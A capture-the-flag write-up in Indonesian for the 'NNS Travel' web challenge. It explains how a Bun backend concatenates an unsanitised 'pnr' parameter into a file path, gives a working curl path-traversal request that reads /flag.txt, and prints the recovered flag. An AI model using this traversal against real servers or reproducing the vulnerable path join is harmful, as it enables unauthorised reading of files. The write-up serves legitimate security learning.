# NNS Travel

## Ringkasan

Aplikasi menyediakan form untuk memasukkan booking reference/PΝR.

Frontend meminta file melalui:

```text
/get-file?pnr=<PNR>.json
```

Masalahnya ada di backend:

```ts
const ticket = url.searchParams.get('pnr');
const f = Bun.file('./tickets/' + ticket);
```

Input `pnr` langsung digabungkan ke path file tanpa sanitasi atau pembatasan directory.

Ini memungkinkan **path traversal** menggunakan `../` untuk keluar dari directory `tickets` dan membaca file lain yang bisa diakses proses.

Target flag diketahui dari deskripsi:

```text
/flag.txt
```

## File Challenge

Struktur source yang diberikan:

```text
.
├── Dockerfile
├── bun.lock
├── package.json
├── src
│   ├── index.ts
│   ├── static
│   │   ├── fonts
│   │   └── style.css
│   └── travel.html
├── tickets
│   └── HACKER.json
└── tsconfig.json
```

Dockerfile menunjukkan source `tickets` disalin ke:

```text
/app/tickets
```

sedangkan working directory server adalah:

```text
/app
```

Jadi file target `/flag.txt` berada di filesystem yang sama dengan aplikasi.

## Analisis Awal

Frontend memiliki input booking reference dengan panjang 6 karakter:

```html
<input type="text"
       id="ticket-id"
       name="ticket-id"
       placeholder="ABCDEF"
       maxlength="6"
       minlength="6" />
```

Frontend kemudian melakukan:

```js
const ticketId = document.querySelector('input').value.toUpperCase();

fetch(`get-file?pnr=${ticketId}.json`, { method: 'POST' });
```

Artinya frontend secara normal hanya membolehkan pola PNR enam karakter dan menambahkan `.json`.

Namun restriction ini hanya berada di sisi client.

## Analisis Backend

Bagian penting berada di `src/index.ts`:

```ts
'/get-file': {
  POST: async (req) => {
    const url = new URL(req.url);
    const ticket = url.searchParams.get('pnr');

    const f = Bun.file('./tickets/' + ticket);

    try {
      return new Response(await f.text(), {
        headers: {
          'Content-Type': 'application/json',
        },
      });
    } catch (e) {
      return Response.json(
        {
          ok: false,
          error: 'Ticket not found.',
        },
        { status: 404 },
      );
    }
  },
},
```

Tidak ada:

```text
path normalization
../ filtering
basename check
directory restriction
```

Input langsung digunakan sebagai bagian path.

Secara normal:

```text
pnr=HACKER.json
```

menjadi:

```text
./tickets/HACKER.json
```

Tetapi kita dapat memberikan:

```text
pnr=../../flag.txt
```

sehingga path menjadi:

```text
./tickets/../../flag.txt
```

yang resolve menjadi:

```text
/flag.txt
```

## Eksploitasi

Frontend tidak perlu digunakan. Kirim request POST langsung ke endpoint.

Command:

```bash
curl -sk -X POST \
'https://nns-travel-50f228394098.chall.nnsc.tf/get-file?pnr=../../flag.txt'
```

Server mengembalikan:

```text
NNS{wHooPs_YoU_FoUND_a_p47h_7RaV3R541_iN_MY_code}
```

## Kenapa `.json` Tidak Dibutuhkan

Frontend menambahkan:

```text
.json
```

sendiri:

```js
fetch(`get-file?pnr=${ticketId}.json`, ...)
```

Tetapi backend tidak menambahkan ekstensi tersebut.

Backend hanya melakukan:

```ts
'./tickets/' + ticket
```

Jadi kita bebas menentukan nama file yang ingin dibaca.

Request manual:

```text
pnr=../../flag.txt
```

menghasilkan:

```text
./tickets/../../flag.txt
```

bukan:

```text
./tickets/../../flag.txt.json
```

Inilah alasan bypass frontend berhasil.

## Root Cause

Kerentanannya adalah **path traversal / arbitrary file read**.

Source langsung membentuk filesystem path dari input user:

```ts
Bun.file('./tickets/' + ticket)
```

tanpa validasi.

Secara umum pola seperti ini berbahaya karena attacker dapat memasukkan:

```text
../
```

untuk keluar dari directory yang seharusnya menjadi sandbox file.

## Cara Menjalankan

Request eksploit:

```bash
curl -sk -X POST \
'https://nns-travel-50f228394098.chall.nnsc.tf/get-file?pnr=../../flag.txt'
```

## Flag

```text
<FLAG>NNS{wHooPs_YoU_FoUND_a_p47h_7RaV3R541_iN_MY_code}</FLAG>
```
